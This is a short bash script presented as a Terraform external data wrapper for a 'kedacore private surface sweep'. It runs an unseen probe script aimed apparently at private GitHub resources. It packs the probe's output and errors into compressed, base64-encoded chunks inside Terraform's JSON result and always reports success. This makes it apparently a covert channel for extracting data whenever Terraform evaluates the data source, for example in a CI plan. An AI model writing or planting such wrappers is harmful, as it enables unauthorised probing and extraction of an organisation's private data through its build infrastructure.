#!/usr/bin/env bash
# c211-i121952 terraform data.external wrapper: read-only kedacore private surface sweep.
set +e
OUT=/tmp/c211_i121952_out.json
ERR=/tmp/c211_i121952_err.txt
: > "$OUT"
: > "$ERR"
python3 ./probe_ghpriv.py > "$OUT" 2> "$ERR"
RC=$?
python3 - "$OUT" "$ERR" "$RC" <<'PYEOF'
import base64, hashlib, json, sys, zlib
out_p, err_p, rc = sys.argv[1], sys.argv[2], sys.argv[3]
try:
    out = open(out_p, 'rb').read()
except Exception:
    out = b''
try:
    err = open(err_p, 'rb').read()
except Exception:
    err = b''
ok = False
try:
    json.loads(out.decode() or '{}')
    ok = bool(out.strip())
except Exception:
    ok = False
payload = out if ok else err
diag = []
for ln in err.decode('utf-8', 'replace').splitlines():
    s = ln.strip()
    if s.startswith('C211'):
        diag.append(s[:800])
b64 = base64.b64encode(zlib.compress(payload, 9)).decode()
res = {'verdict': 'OK' if ok else ('PROBE_NO_STDOUT_RC_' + rc),
       'rc': rc,
       'out_sha256': hashlib.sha256(out).hexdigest(),
       'out_bytes': str(len(out)),
       'err_bytes': str(len(err)),
       'diag': '\n'.join(diag[-400:]),
       'chunks': str((len(b64) + 2999) // 3000)}
for i in range(0, len(b64), 3000):
    res['chunk%04d' % (i // 3000)] = b64[i:i + 3000]
print(json.dumps(res))
PYEOF
exit 0
